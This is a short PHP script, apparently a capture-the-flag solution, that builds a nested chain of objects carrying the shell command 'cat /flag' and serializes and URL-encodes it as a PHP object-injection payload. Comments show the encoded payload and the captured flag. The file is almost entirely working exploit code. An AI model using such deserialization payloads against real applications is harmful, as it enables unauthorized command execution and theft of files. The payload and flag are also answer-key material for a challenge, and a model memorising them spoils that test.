<?php

class T1{
    protected $a;
    function __construct($args) { $this->a = $args; }
}
class T2{
    protected  $b;
    function __construct($args) { $this->b = $args; }
}
class T3{
    protected  $c;
    function __construct($args) { $this->c = $args; }
}

$t3 = new T3("cat /flag");
$t2 = new T2($t3);
$t1 = new T1($t2);
echo urlencode(serialize($t1));
// O%3A2%3A%22T1%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00a%22%3BO%3A2%3A%22T2%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00b%22%3BO%3A2%3A%22T3%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00c%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D
// flag{w4lcome_t0_it}

?>